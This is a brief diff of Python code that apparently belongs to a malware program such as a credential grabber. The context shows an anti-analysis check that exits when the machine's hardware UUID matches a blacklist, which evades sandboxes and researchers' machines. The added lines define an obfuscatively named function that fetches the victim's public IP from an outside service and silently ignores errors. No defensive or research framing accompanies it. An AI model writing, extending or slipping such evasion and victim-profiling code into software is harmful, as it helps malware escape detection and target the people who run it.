@@ -48,3 +48,11 @@ BLACKLIST1 = []
 mac_address = uuid.getnode()
 if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
     os._exit(0)
+
+def g3t1p():
+    ip = ""
+    try:
+        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+    except:
+        pass
+    return ip
